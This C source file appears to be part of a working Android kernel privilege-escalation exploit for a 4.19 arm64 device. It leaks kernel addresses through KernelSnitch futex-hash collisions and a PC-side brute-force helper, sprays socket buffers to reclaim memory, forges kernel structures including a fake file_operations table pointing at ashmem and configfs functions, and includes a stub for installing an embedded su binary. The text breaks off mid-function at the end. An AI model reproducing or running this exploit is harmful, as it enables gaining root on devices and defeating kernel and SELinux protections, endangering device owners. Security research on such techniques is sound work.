#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;
static uintptr_t cached_leaked_mm;
static int slab_base_candidate;
int ks_leak_walk_touched;

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
char ashmem_path[256] = "/dev/ashmem";

uintptr_t g_direct_map_end = DIRECT_MAP_END;
uintptr_t g_direct_map_base = DIRECT_MAP_BASE;
uintptr_t g_linear_map_delta = 0;
uintptr_t g_leak_target = 0;
static size_t g_ram_bytes;

static char ks_cache_path[512];

static int read_boot_id(char *buf, size_t len) {
  FILE *f = fopen("/proc/sys/kernel/random/boot_id", "r");
  if (!f) return 0;
  if (!fgets(buf, len, f)) {
    fclose(f);
    return 0;
  }
  fclose(f);
  buf[strcspn(buf, "\r\n")] = 0;
  return strlen(buf) >= 8;
}

static int cache_path_usable(const char *path, int write) {
  char parent[512];
  char *slash;
  size_t n;
  if (!path || !*path || strlen(path) >= sizeof(parent)) return 0;
  if (access(path, F_OK) == 0)
    return access(path, write ? W_OK : R_OK) == 0;
  n = strlen(path);
  memcpy(parent, path, n + 1);
  slash = strrchr(parent, '/');
  if (!slash) return 0;
  if (slash == parent) parent[1] = 0;
  else *slash = 0;
  return access(parent, write ? W_OK : R_OK) == 0;
}

static const char *select_ks_cache_path(int write) {
  const char *env;
  const char *dir;
  char candidate[512];

  env = getenv("KS_CACHE_PATH");
  if (env && *env && cache_path_usable(env, write)) {
    snprintf(ks_cache_path, sizeof(ks_cache_path), "%s", env);
    return ks_cache_path;
  }

  dir = getenv("GHOSTLOCK_HOME");
  if (dir && *dir) {
    snprintf(candidate, sizeof(candidate), "%s/ks_cache.txt", dir);
    if (cache_path_usable(candidate, write)) {
      snprintf(ks_cache_path, sizeof(ks_cache_path), "%s", candidate);
      return ks_cache_path;
    }
  }
  dir = getenv("TMPDIR");
  if (dir && *dir) {
    snprintf(candidate, sizeof(candidate), "%s/ks_cache.txt", dir);
    if (cache_path_usable(candidate, write)) {
      snprintf(ks_cache_path, sizeof(ks_cache_path), "%s", candidate);
      return ks_cache_path;
    }
  }
  dir = getenv("HOME");
  if (dir && *dir) {
    snprintf(candidate, sizeof(candidate), "%s/ks_cache.txt", dir);
    if (cache_path_usable(candidate, write)) {
      snprintf(ks_cache_path, sizeof(ks_cache_path), "%s", candidate);
      return ks_cache_path;
    }
  }
  if (cache_path_usable("/sdcard/Download/ghostlock_ks_cache.txt", write)) {
    snprintf(ks_cache_path, sizeof(ks_cache_path), "%s",
             "/sdcard/Download/ghostlock_ks_cache.txt");
    return ks_cache_path;
  }
  if (cache_path_usable("/data/local/tmp/ks_cache.txt", write)) {
    snprintf(ks_cache_path, sizeof(ks_cache_path), "%s",
             "/data/local/tmp/ks_cache.txt");
    return ks_cache_path;
  }
  return NULL;
}

static size_t ks_cache_radius_bytes(void) {
  const char *env = getenv("KS_CACHE_RADIUS_GB");
  unsigned long long gb = env ? strtoull(env, NULL, 0) : 8;
  if (!gb) gb = 8;
  if (gb > 128) gb = 128;
  return (size_t)gb << 30;
}

static int ks_cache_load(uintptr_t *anchor, char *boot_id, size_t boot_len) {
  const char *path;
  FILE *f;
  char line[128] = "";
  char file_boot[128] = "";
  unsigned long long value = 0;
  int have_anchor = 0;

  if (!read_boot_id(boot_id, boot_len)) return 0;
  path = select_ks_cache_path(0);
  if (!path) return 0;
  f = fopen(path, "r");
  if (!f) return 0;
  while (fgets(line, sizeof(line), f)) {
    line[strcspn(line, "\r\n")] = 0;
    if (!strncmp(line, "boot_id=", 8)) {
      snprintf(file_boot, sizeof(file_boot), "%s", line + 8);
      continue;
    }
    if (sscanf(line, "anchor_mm=0x%llx", &value) == 1 ||
        sscanf(line, "anchor_mm=%llx", &value) == 1) {
      have_anchor = 1;
    }
  }
  fclose(f);
  if (!have_anchor || value < DIRECT_MAP_BASE || value >= DIRECT_MAP_END) return 0;
  if (strcmp(file_boot, boot_id) != 0) return 0;
  *anchor = (uintptr_t)value;
  return 1;
}

static void ks_cache_save(uintptr_t anchor) {
  const char *path;
  char boot_id[128];
  FILE *f;
  if (anchor < DIRECT_MAP_BASE || anchor >= DIRECT_MAP_END) return;
  if (!read_boot_id(boot_id, sizeof(boot_id))) return;
  path = select_ks_cache_path(1);
  if (!path) return;
  f = fopen(path, "w");
  if (!f) {
    pr_warning("KS_CACHE save failed path=%s\n", path);
    return;
  }
  fprintf(f, "boot_id=%s\nanchor_mm=0x%016zx\n", boot_id, anchor);
  fclose(f);
  pr_info("KS_CACHE save path=%s anchor=%016zx\n", path, anchor);
}

static int linear_delta_index(void) {
  const char *env = getenv("GHOSTLOCK_DELTA_INDEX");
  if (env && *env) {
    return atoi(env);
  }

  /* PC keeps this file world-writable and updates it between candidate
   * runs; an app cannot create files in /data/local/tmp, so it only reads
   * an already-created file and defaults to index 0. */
  FILE *f = fopen("/data/local/tmp/ks_delta_index.txt", "r");
  if (!f) {
    return 0;
  }
  char line[32] = "";
  if (!fgets(line, sizeof(line), f)) {
    fclose(f);
    return 0;
  }
  fclose(f);
  return atoi(line);
}

/* The kernel computes VA(phys) = PAGE_OFFSET + phys - memstart_addr.  For a
 * leaked mm at mm_va, every 1GB-aligned memstart that maps mm_va back into
 * alioth's RAM gives exactly one linear-map delta.  CFI step=4 is the
 * on-device oracle for which candidate is real. */
void select_linear_map_delta(uintptr_t mm_va) {
  /* Offline source verification (memory.h:280): 4.19 arm64 has NO linear
   * map randomization -- __phys_to_virt is (x - PHYS_OFFSET) | PAGE_OFFSET,
   * so g_linear_map_delta is always 0 and any leaked mm outside
   * [PAGE_OFFSET, PAGE_OFFSET+8GB) is a KernelSnitch false positive. */
  uintptr_t mm_off = mm_va - P0_PAGE_OFFSET;
  if (mm_off >= 0x200000000ULL) {
    pr_error("KS_DELTA mm=%016zx offset=%016zx exceeds 8GB linear map: "
             "false-positive leak, refusing delta\n", mm_va, mm_off);
    g_linear_map_delta = 0;
    return;
  }
  if (g_linear_map_delta != 0) {
    pr_info("KS_DELTA forcing delta=0 (4.19 linear map is not randomized, "
            "was 0x%016zx)\n", g_linear_map_delta);
    g_linear_map_delta = 0;
    return;
  }
  pr_info("KS_DELTA delta=0 confirmed (mm offset=%016zx in linear map)\n",
          mm_off);
  return;

  static const int64_t ram_start = (int64_t)P0_PHYS_OFFSET;
  static const int64_t ram_end = (int64_t)0x280000000ULL;
  static const int64_t section = (int64_t)1 << 30;
  int64_t diff = (int64_t)(mm_va - P0_PAGE_OFFSET);
  int64_t first = ram_start - diff;
  int64_t memstart = (first + section - 1) & ~(section - 1);
  int candidates = 0;
  int selected = -1;
  int want = linear_delta_index();
  uintptr_t delta_first = 0;

  for (int i = 0; i < 32 && memstart < ram_end; ++i, memstart += section) {
    int64_t mm_phys = memstart + diff;
    if (mm_phys < ram_start || mm_phys >= ram_end) {
      continue;
    }
    uintptr_t delta = (uintptr_t)(memstart - (int64_t)P0_PHYS_OFFSET);
    if (!candidates) {
      delta_first = delta;
    }
    if (candidates == want) {
      g_linear_map_delta = delta;
      selected = candidates;
    }
    pr_info("KS_DELTA candidate[%d] memstart=%016llx delta=%016zx "
            "mm_phys=%016llx%s\n",
            candidates, (unsigned long long)memstart, delta,
            (unsigned long long)mm_phys,
            candidates == want ? " <selected>" : "");
    candidates++;
  }

  if (!candidates) {
    pr_error("KS_DELTA no plausible memstart candidates mm=%016zx\n", mm_va);
    g_linear_map_delta = 0;
    return;
  }
  if (selected < 0) {
    pr_warning("KS_DELTA index=%d out-of-range count=%d; using first\n",
               want, candidates);
    g_linear_map_delta = delta_first;
    selected = 0;
  }
  pr_info("KS_DELTA selected index=%d/%d mm=%016zx diff=%016llx delta=%016zx\n",
          selected, candidates, mm_va,
          (unsigned long long)diff, g_linear_map_delta);
}

static void set_ks_window(uintptr_t anchor, int hit) {
  size_t radius = ks_cache_radius_bytes();
  uintptr_t start = DIRECT_MAP_BASE;
  uintptr_t end = DIRECT_MAP_END;
  if (hit && anchor >= DIRECT_MAP_BASE + radius)
    start = anchor - radius;
  if (hit && anchor <= DIRECT_MAP_END - radius)
    end = anchor + radius;
  ks->identity_start = start;
  ks->identity_end = end;
  if (hit)
    pr_info("KS_CACHE hit path=%s anchor=%016zx start=%016zx end=%016zx radius=%zuGB\n",
            ks_cache_path, anchor, start, end, radius >> 30);
}

/* read RAM size from /proc/meminfo so the physmap scan never walks (and never
 * reports) physical addresses that do not exist on this device */
static void detect_memory(void) {
  if (g_ram_bytes) {
    return;
  }
  size_t kb = 0;
  FILE *f = fopen("/proc/meminfo", "r");
  if (f) {
    char line[256];
    while (fgets(line, sizeof(line), f)) {
      unsigned long long v = 0;
      if (sscanf(line, "MemTotal: %llu kB", &v) == 1) {
        kb = (size_t)v;
        break;
      }
    }
    fclose(f);
  }
  if (!kb) {
    kb = 8ULL * 1024 * 1024;  /* conservative default 8 GB */
  }
  size_t bytes = kb * 1024;
  if (bytes < (1ULL << 30)) bytes = 1ULL << 30;
  if (bytes > (32ULL << 30)) bytes = 32ULL << 30;
  /* round up to 1 GB */
  bytes = (bytes + ((1ULL << 30) - 1)) & ~((1ULL << 30) - 1);
  g_ram_bytes = bytes;
  /* fine-scan the full linear region: 39-bit VA gives 256GB and the vendor
   * kernel may randomize the linear map (RANDOMIZE_BASE), so scan it all */
  g_direct_map_end = DIRECT_MAP_END;
  pr_info("memory detected ram=0x%zx (%zu GB) window_end=%016zx\n",
          g_ram_bytes, g_ram_bytes >> 30, (size_t)g_direct_map_end);
}

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  detect_memory();
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);  /* verbose diagnostics for on-device debug */
  ks->identity_end = (size_t)g_direct_map_end;
  const char *delta_str = getenv("KS_LINEAR_DELTA");
  if (delta_str && *delta_str) {
    g_linear_map_delta = strtoull(delta_str, NULL, 0);
    pr_info("linear_map delta override=0x%016zx\n", g_linear_map_delta);
  }
  ks->ram_bytes = g_ram_bytes;
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

/* candidate SLUB object sizes for the mm_struct cache (ALIGN to cacheline).
 * 0x340 was verified on-device (K40/SD870-class 4.19). */
static const size_t ksnitch_mm_sizes[] = {
  0x340, 0x380, 0x358, 0x400, 0x360, 0x300, 0x3c0, 0x480,
};
/* The vendor kernel randomizes the linear map (RANDOMIZE_BASE backport), so
 * VA - PAGE_OFFSET is not the physical address. A 7/7 futex-hash agreement
 * has false-positive odds of ~1e-24, which is self-validating; only check the
 * candidate lies inside the scanned linear region. */
static int mm_plausible(size_t mm) {
  if (mm < DIRECT_MAP_BASE || mm >= (size_t)g_direct_map_end) {
    return 0;
  }
  return 1;
}

/* Export the collision futex addresses so a PC worker can search the whole
 * 256GB linear map in parallel; the device then only polls for the answer. */
static void ks_export_collisions(const char *boot_id) {
  char path[256];
  FILE *f;
  snprintf(path, sizeof(path), "/data/local/tmp/ks_collisions.txt");
  /* Untrusted-app context cannot create files in /data/local/tmp, so the
   * helper pre-creates a world-writable file; write in place (no tmp+rename). */
  f = fopen(path, "w");
  if (!f) {
    pr_warning("KS_PC export failed path=%s\n", path);
    return;
  }
  fprintf(f, "boot_id=%s\n", boot_id);
  fprintf(f, "futex_hashsize=0x%lx\n", (unsigned long)futex_hashsize);
  fprintf(f, "collisions=%zu\n", ks->collisions);
  for (size_t i = 0; i < ks->collisions; ++i) {
    fprintf(f, "futex_addr=0x%016zx\n", (size_t)ks->futex_addrs[i]);
  }
  fclose(f);
  pr_info("KS_PC export path=%s addrs=%zu hashsize=0x%lx\n",
          path, ks->collisions, (unsigned long)futex_hashsize);
}

/* Read a PC-provided mm answer; only accept 64B-aligned alioth linear-map
 * VAs so a stale/corrupt file can't poison the exploit. */
static int ks_pc_answer_read(uintptr_t *out) {
  FILE *f = fopen("/data/local/tmp/ks_mm_answer.txt", "r");
  unsigned char buf[64];
  size_t n, i;
  uintptr_t mm = 0;
  if (!f) return 0;
  /* Strict wire format: the whole file must be exactly
   * "mm=0x" + 16 lowercase hex digits + LF (22 bytes), or the same
   * payload with CRLF (23 bytes) for compatibility with older Windows
   * text-mode writers. Anything else (partial write, NUL padding,
   * stale data) is rejected instead of parsed. */
  n = fread(buf, 1, sizeof(buf), f);
  fclose(f);
  if (n != 22 && n != 23) {
    if (n) pr_warning("KS_PC answer rejected len=%zu (expect 22 LF or 23 CRLF)\n", n);
    return 0;
  }
  int eol_ok = n == 22 ? buf[21] == '\n'
                       : (buf[21] == '\r' && buf[22] == '\n');
  if (memcmp(buf, "mm=0x", 5) != 0 || !eol_ok) {
    pr_warning("KS_PC answer rejected format\n");
    return 0;
  }
  for (i = 5; i < n - 1; ++i) {
    unsigned char c = buf[i];
    unsigned v;
    if (c >= '0' && c <= '9') v = c - '0';
    else if (c >= 'a' && c <= 'f') v = c - 'a' + 10;
    else {
      pr_warning("KS_PC answer rejected hex\n");
      return 0;
    }
    mm = (mm << 4) | v;
  }
  if ((mm & 0x3f) == 0 && mm_plausible(mm)) {
    *out = mm;
    return 1;
  }
  pr_warning("KS_PC answer rejected mm=%016zx\n", mm);
  return 0;
}

/* Wait up to KS_PC_WAIT seconds for the PC worker to drop its answer. */
static int ks_pc_wait_answer(uintptr_t *out) {
  const char *env = getenv("KS_PC_WAIT");
  const char *poll_env = getenv("KS_PC_POLL_MS");
  int wait_s = env ? atoi(env) : 60;
  int poll_ms = poll_env ? atoi(poll_env) : 1000;
  if (poll_ms < 250) poll_ms = 250;
  if (poll_ms > 2000) poll_ms = 2000;
  if (wait_s <= 0) return 0;
  pr_info("KS_PC waiting up to %ds poll_ms=%d for %s\n", wait_s, poll_ms,
          "/data/local/tmp/ks_mm_answer.txt");
  int elapsed_ms = 0;
  while (elapsed_ms < wait_s * 1000) {
    if (ks_pc_answer_read(out)) {
      return 1;
    }
    usleep(poll_ms * 1000);
    elapsed_ms += poll_ms;
  }
  return ks_pc_answer_read(out);
}

/* Called from every scan thread at coarse-block boundaries so a PC answer
 * can short-circuit a local 256GB scan in progress. */
int ks_pc_abort_check(uintptr_t *out) {
  return ks_pc_answer_read(out);
}

void run_kernelsnitch_bruteforce(void) {
  char boot_id[128];
  uintptr_t anchor = 0;
  int hit = ks_cache_load(&anchor, boot_id, sizeof(boot_id));
  if (!hit)
    pr_info("KS_CACHE miss reason=no-valid-cache\n");
  if (kernelsnitch_collisions_ready()) {
    ks_export_collisions(boot_id);
    uintptr_t pc_mm = 0;
    if (ks_pc_wait_answer(&pc_mm)) {
      pr_info("KS_PC answer accepted mm=%016zx (skipping device scan)\n", pc_mm);
      ks->mm_struct = (size_t)pc_mm;
      ks->found = 1;
      ks->state = KERNELSNITCH_MM_FOUND;
      ks_cache_save((uintptr_t)ks->mm_struct);
      return;
    }
  }
  set_ks_window(anchor, hit);
  kernelsnitch_bruteforce(ks);
  if (ks->mm_struct != (size_t)-1 && mm_plausible(ks->mm_struct)) {
    pr_info("KernelSnitch mm found addr=%016zx sz=0x%zx\n",
            ks->mm_struct, ks->mm_struct_sz);
    ks_cache_save(ks->mm_struct);
    return;
  }
  if (hit) {
    pr_info("KS_CACHE miss reason=scan-failed falling-back=full-256GB\n");
    ks->state = KERNELSNITCH_COLLISIONS_FOUND;
    set_ks_window(0, 0);
    kernelsnitch_bruteforce(ks);
  }
  if (ks->mm_struct != (size_t)-1 && mm_plausible(ks->mm_struct)) {
    pr_info("KernelSnitch mm found addr=%016zx sz=0x%zx\n",
            ks->mm_struct, ks->mm_struct_sz);
    ks_cache_save(ks->mm_struct);
    return;
  }
  pr_warning("KernelSnitch mm_struct leak failed (no size/order sweep)\n");
}

/* Buddy-allocated order-3 slabs are aligned to 2^3 pages, so the mm's
 * containing slab starts at the leaked address truncated to 32KB. */
static uintptr_t select_slab_base(uintptr_t leaked, int candidate) {
  (void)candidate;
  const char *override = getenv("KSLAB_BASE");
  if (override && *override) {
    uintptr_t base = strtoull(override, NULL, 16);
    if (base && base <= leaked &&
        leaked - base < ORDER3_SIZE) {
      return base;
    }
  }
  return leaked & ~((uintptr_t)ORDER3_SIZE - 1);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

__attribute__((weak))
int install_embedded_wallpaper(void) {
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void log_slide_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
             "egid=%u attr=%s enforce=%s\n",
             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_OTHER;
  attr.sched_nice = nice_value;
  int ret = (int)syscall(SYS_sched_setattr, tid, &attr, 0);
  int saved = errno;
  if (ret == 0) return 0;
  pr_warning("sched_setattr tid=%d nice=%d ret=%d errno=%d; "
             "falling back to setpriority\n", tid, nice_value, ret, saved);
  /* Fallback: setpriority(PRIO_PROCESS, tid, nice) is simpler and
   * triggers the same PI chain walk via __sched_setscheduler. */
  errno = 0;
  ret = setpriority(PRIO_PROCESS, tid, nice_value);
  if (ret != 0) {
    pr_warning("setpriority tid=%d nice=%d ret=%d errno=%d\n",
               tid, nice_value, ret, errno);
  }
  return ret;
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

int has_zero_byte(uintptr_t value) {
  for (int i = 0; i < 8; i++) {
    if (((value >> (i * 8)) & 0xff) == 0) {
      return 1;
    }
  }
  return 0;
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t data_addr(uintptr_t image_addr) {
  /* Linear-map randomization: memstart_addr shifts every phys→VA
   * translation by a constant.  We can't read memstart_addr, but we can
   * compute the delta from the KernelSnitch mm address: the kernel data
   * (fops) and the mm struct are both in the same contiguous linear map,
   * so data_va = mm_va - (mm_phys - data_phys).  We approximate by
   * subtracting a tunable delta from the unslid alias. */
  return p0_data_alias(image_addr) - g_linear_map_delta;
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

/* Read back SKB data from the reclaim socket after the PI chain walk.
 * The kernel may have modified the SKB data at page_base (rb ops,
 * waiter->prio = task->prio copy).  recvmsg lets us see the kernel's
 * copy, giving us a read primitive for the controlled page. */
uint32_t ks_leak_readback(void) {
  if (reclaim_sv[1] < 0 || !skb_buf) {
    pr_warning("KS_LEAK no socket or buf sv=%d buf=%p\n",
               reclaim_sv[1], (void *)skb_buf);
    return 0;
  }

  static unsigned char rbuf[SKB_SEND_SIZE];
  struct iovec iov = { rbuf, SKB_SEND_SIZE };
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  size_t prio_off = (size_t)W0_OFF + 0x40;
  size_t lock_off = (size_t)LOCK_OFF;
  uint32_t orig = FAKE_WAITER_PRIO;
  uint32_t leak = 0;
  ks_leak_walk_touched = 0;

  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    ssize_t n = recvmsg(reclaim_sv[1], &msg, MSG_DONTWAIT);
    if (n <= 0) {
      pr_info("KS_LEAK recv %d n=%zd errno=%d\n", i, n, errno);
      break;
    }
    size_t check = (size_t)n < SKB_SEND_SIZE ? (size_t)n : SKB_SEND_SIZE;
    if (prio_off + 4 > check) continue;

    uint32_t got;
    memcpy(&got, rbuf + prio_off, 4);
    uint32_t wait_lock;
    memcpy(&wait_lock, rbuf + lock_off, 4);
    pr_info("KS_LEAK skb[%d] wait_lock=0x%08x prio=0x%08x orig=0x%08x %s\n",
            i, wait_lock, got, orig, got != orig ? "LEAK!" : "same");
    if (wait_lock != 0) {
      pr_success("KS_LEAK wait_lock MODIFIED: chain walk trylocked "
                 "our fake_lock! pi_blocked_on was non-NULL!\n");
    }
    if (wait_lock != 0 || got != orig) {
      ks_leak_walk_touched = 1;
    }
    pr_info("KS_LEAK skb[%d] prio_off=0x%zx val=0x%08x orig=0x%08x %s\n",
            i, prio_off, got, orig, got != orig ? "LEAK!" : "same");
    if (got != orig) {
      leak = got;
      break;
    }
  }
  return leak;
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
#ifdef CFGOPS_4_19_STYLE
  /* 4.19: pread/pwrite call f_op->read/write directly; configfs_read_file /
   * configfs_write_bin_file have exactly those signatures on 4.19 */
  put64(p, off + FOPS_READ_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_READ_ITER_OFF, 0);
  put64(p, off + FOPS_WRITE_ITER_OFF, 0);
#else
  put64(p, off + FOPS_READ_OFF, 0);
  put64(p, off + FOPS_WRITE_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
#endif
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  /* run collision finding in the MAIN process so the target mm is the
   * parent's live mm_struct (not a fork child whose mm is freed on exit) */
  kernelsnitch_find_collisions(ks);
  return getpid();
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
